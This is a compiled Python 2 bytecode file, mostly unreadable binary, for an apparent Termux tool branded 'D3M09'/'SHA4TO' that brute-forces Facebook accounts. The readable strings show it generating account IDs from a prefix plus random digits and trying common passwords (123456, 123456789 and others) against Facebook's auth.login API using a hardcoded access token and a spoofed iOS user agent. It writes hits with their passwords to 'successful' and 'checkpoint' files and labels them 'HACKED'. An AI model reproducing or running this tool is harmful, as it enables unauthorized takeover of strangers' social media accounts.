�

�� �c           @   s/  e  Z e r# d  d  Z � � Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l Z

 d d l Z d d l Z d d l

 Z

 d d l Z d d l Z e j d � xJ e d � D]< Z e j d d � Z e d d � e _ e GHe j j �  q� Wy d d l Z Wn e k

 rIe j d	 � n Xy d d l Z Wn8 e k

 r�e j d

 � e j d � e j d � n Xd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l

 Z

 d d l Z d d l Z d d l

 Z

 d d l Z d d l Z d d

 l m Z d d l m Z d d l m  Z  e! e � e j" d � e j  �  Z# e# j$ e  � e# j% e j& j' �  d d �d2 g e# _( d3 g e# _( d �  Z) d �  Z* d �  Z+ d �  Z, d  Z- g  a. g  Z/ g  a0 d Z1 d Z2 e j d � d Z3 e3 GHd Z4 d Z5 d  Z6 x� e6 d  k r�e7 d! � Z8 e8 e4 k r�e7 d" � Z9 e9 e5 k r�d# GHe j d � d$ Z6 q�d% GHe j d& � q:d' GHe j d& � q:Wd( �  Z: d) �  Z; d* �  Z< d+ �  Z= d, �  Z> d- �  Z? d. �  Z@ eA d/ k r+e j d0 � e j d1 � e; �  n  d S(4   i    i����Ns   rm -rf .txti� iG� i�� s   .txtt   as   pip2 install mechanizes   pip2 install requesti   s   Then type: python2 2k9.pyc(   t

   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times

   User-Agents�   Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5];FBNV/1s

   user-agents�   Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]c         C   sS   d } d } x: t  D]2 } | d | t j d t | � d � | 7} q Wt | � S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   2k9.pyt   acak&   s

    

0c         C   s~   d } xA | D]9 } | j  | � } | j d | d t d | � � } q

 W| d 7} | j d d � } t j j | d � d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   

(   t   indext   replacet   strt   syst   stdoutt   write(   R   R   R   t   jR	   (    (    s   2k9.pyR

   /   s    

(

c         C   sG   x@ |  d D]4 } t  j j | � t  j j �  t j d d � q Wd  S(   Ns   

g      @i�   (   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   2k9.pyt   jalan:   s    

c          C   sR   d d d d d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q" Wd  S(   Ns      s   .  s   .. s   ...s;   

[1;91m     [●] [1;92mD3M09 TOOL Loa[1;90mding [1;97mg      �?(   R   R   R   R   R   (   t   titikt   o(    (    s   2k9.pyt   tikA   s

    



s

   [31mNot Vulns	   [32mVulnt   clearsN  [1;91m         ____ _____ __  __  ___   ___

[1;91m         ..######..##.....##....###....##........########...#####..

 .##....##.##.....##...##.##...##....##.....##.....##...##.

 .##.......##.....##..##...##..##....##.....##....##.....##

 ..######..#########.##.....##.##....##.....##....##.....##

 .......##.##.....##.#########.#########....##....##.....##

 .##....##.##.....##.##.....##.......##.....##.....##...##.

 ..######..##.....##.##.....##.......##.....##......#####..

[1;92m       

[1;92m        

[1;91m        

[1;91m       

----------------------Whatsapp:+8801818819771----------------------------

[1;97mt   SHA4TOt   VAU   trues-   [1;92m [1;92mTool Username [1;92m:[1;92m s-   [1;92m [1;92mTool Password [1;92m:[1;92m s   Login Successfull as SHA4TOt   falses   [1;92mWrong Passwords1   xdg-open https://www.facebook.com/ITS.SHA4T0s   [1;92mWrong Usernamec           C   s   t  j d � t �  d  S(   NR#   (   t   ost   systemt   login(    (    (    s   2k9.pyt   lisensih   s    

c           C   s2   t  j d � t GHHd GHd GHd GHd GHt �  d  S(   NR#   sG   [1;93m([1;97m1[1;93m)[1;92m 2009-10[1;93m [[1;97mTwo Code[1;93m]sG   [1;93m([1;97m2[1;93m)[1;92m 2008-09[1;93m [[1;97mOne Code[1;93m]s$   [1;93m([1;97mH[1;93m)[1;92m Helps$   [1;93m([1;97m0[1;93m)[1;97m Back(   R(   R)   t   logo1t

   gaja_demon(    (    (    s   2k9.pyR*   m   s    

c          C   sx   t  d � }  |  d k r' d GHt �  nM |  d k r= t �  n7 |  d k rS t �  n! |  d k ro t j d � n d GHd  S(	   Ns   

[1;95m•➢ [1;96mR   s   [1;97mFill In Correctlyt   1t   2s   H,hs1   xdg-open https://www.facebook.com/ITS.SHA4T0s   Fill In Correctly(   t	   raw_inputt

   gaja_logint   pR   R(   R)   (   t   demon(    (    s   2k9.pyR-   x   s    





c           C   s#   t  j d � t GHHd GHt �  d  S(   NR#   s   Do You Want Countinue [y/n](   R(   R)   R,   t   act(    (    (    s   2k9.pyR2   �   s

    

c             s�  t  d � }  |  d k r' d GHt �  n� |  d k r� t �  t j d � t GHHd GHd GHHyO t  d � �  d	 � d

 } x0 t | d � j �  D] } t j	 | j

 �  � q� WWq� t k

 r� d GHt  d

 � |  �  q� Xn" |  d k r� t �  n d GHt

 �  d d GHt t t � � } t d | � t d � d d GH�  � f d �  } t d � } | j | t � d d GHd GHt  d � t �  d  S(   Ns   

 [1;97m  R   s   [!] Fill in correctlyt   yR#   s   [1;93mTYPE ANY TWO CODEs   

s   >>> t   100000s   .txtt   rs   [!] File Not Founds	   

[ Back ]t   ns   [!] Fill In Correctlyi/   s   [1;93m-s   [1;96m TOTAL IDS NUMBER : s.   [1;93m TO STOP THIS PROCESS PRESS Ctrl THEN zc   	         s�  |  } y t  j d � Wn t k

 r* n Xyvd } t j d � �  | d | d � } t j | � } d | k r� d � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � n�d | d

 k rTd � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � nLd } t j d � �  | d | d � } t j | � } d | k rd � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � n�d | d

 k rzd � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � n&d } t j d � �  | d | d � } t j | � } d | k r)d � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � nw d | d

 k r�d � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � n  Wn n Xd  S(   Nt   savet   123456s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens3   [1;93m   (SHA4TO-HAC[1;92mKED)[1;91m ●  [1;97ms   [1;91m ● [1;95ms   sdcard/ids/successful.txtR    s   

s   www.facebook.comt	   error_msgs5   [1;92m   (D3M09-[1;97mCP[1;93m)[1;91m ● [1;97ms   [1;91m ● [1;96m s   sdcard/ids/checkpoint.txtt	   123456789s   @@123@@(   R(   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   appendt   cpb(	   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3(   t   ct   k(    s   2k9.pyt   main�   sj    

'



'



'



i   i2   s   [1;91m-s   Process Has Been Completed ...s   

[1;92m[[1;92mBack[1;95m](   R0   R4   R"   R(   R)   R,   RA   t	   readlinest   idRF   t   stript   IOErrorR*   t   actionR   R   R   R   t   map(   R3   t   idlistt   linet   xxxRS   R2   (    (   RQ   RR   s   2k9.pyR4   �   sL    









	

	<	

c           C   s$   t  j d � t GHHHd GHt �  d  S(   NR#   s   Do You Want Countinue [y/n](   R(   R)   R,   RX   (    (    (    s   2k9.pyR   �   s    

c             s�  t  d � }  |  d k r' d GHt �  n� |  d k r� t �  t j d � t GHHyO t  d � �  d � d } x0 t | d	 � j �  D] } t j	 | j

 �  � q~ WWq� t k

 r� d

 GHt  d � |  �  q� Xn" |  d k r� t �  n d GHt �  d

 d GHt

 t t � � } t d | � t d � d

 d GH�  � f d �  } t d � } | j | t � d d GHd GHd t

 t t � � d t

 t t � � GHt  d � t �  d  S(   Ns   

 [1;97m  R   s   [!] Fill In CorrectlyR5   R#   s   TYPE ANY 1 DIGIT NUMBER >>>t   1000000s   .txtR7   s   [!] File Not Founds	   

[ Back ]R8   i/   s   [1;93m-s   [1;96m TOTAL IDS NUMBER : s.   [1;93m TO STOP THIS PROCESS PRESS Ctrl THEN zc   

         s�  |  } y t  j d � Wn t k

 r* n Xy�d } t j d � �  | d | d � } t j | � } d | k r� d � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � n�d | d

 k rTd � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � nrd } t j d � �  | d | d � } t j | � } d | k rd � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � n�d | d

 k rzd � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � nLd } t j d � �  | d | d � } t j | � } d | k r)d � �  | d | GHt d	 d

 � } | j � �  | | d � | j �  t	 j

 �  | | � n�d | d

 k r�d � �  | d | GHt d d

 � } | j � �  | | d � | j �  t j

 �  | | � n&d }	 t j d � �  | d |	 d � } t j | � } d | k rOd � �  | d |	 GHt d	 d

 � } | j � �  | |	 d � | j �  t	 j

 �  | |	 � nw d | d

 k r�d � �  | d |	 GHt d d

 � } | j � �  | |	 d � | j �  t j

 �  | |	 � n  Wn n Xd  S(   NR9   R:   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmR;   s3   [1;93m   (D3M09-HAC[1;92mKED)[1;91m ●  [1;97ms   [1;91m ● [1;95ms   sdcard/ids/successful.txtR    s   

s   www.facebook.comR<   s5   [1;92m   (D3M09[1;97m-CP[1;93m)[1;91m ● [1;97ms   [1;91m ● [1;96m s   sdcard/ids/checkpoint.txtR=   s5   [1;92m   (D3M09-[1;97mCP[1;93m)[1;91m ● [1;97mt   1234567t   12345678(   R(   R>   R?   R@   RA   RB   RC   R   RD   RE   RF   RG   (

   RH   RI   RJ   RK   RL   RM   RN   RO   RP   t   pass4(   RQ   RR   (    s   2k9.pyRS   !  s�    

'



'



'



'



i   i2   s   [1;91m-s   Process Has Been Completed ...s   Total Online/Offline : t   /s   

[1;92m[[1;92mBack[1;95m](   R0   RX   R"   R(   R)   R,   RA   RT   RU   RF   RV   RW   R*   R   R   R   R   RY   RE   RG   (   R3   RZ   R[   R\   RS   R2   (    (   RQ   RR   s   2k9.pyRX      sH    









	

	J	)

t   __main__s   git pulls   termux-setup-storage(   s

   User-Agents�   Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5];FBNV/1(   s

   user-agents�   Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5](B   t   Falset   foot   barR(   R   R   t   datetimeR

   t   hashlibt   ret	   threadingRB   t   urllibt	   cookielibt   getpasst   uuidR)   t   rangeR8   R   t   nmbrRA   R   R   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR@   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort

   addheadersR   R

   R   R"   t   backRE   RU   RG   t   vulnott   vulnR,   t   CorrectUsernamet   CorrectPasswordt   loopR0   t   usernamet   passwordR+   R*   R-   R2   R4   R   RX   t   __name__(    (    (    s   2k9.pyt   <module>   s�   



�









�





						



						h			t




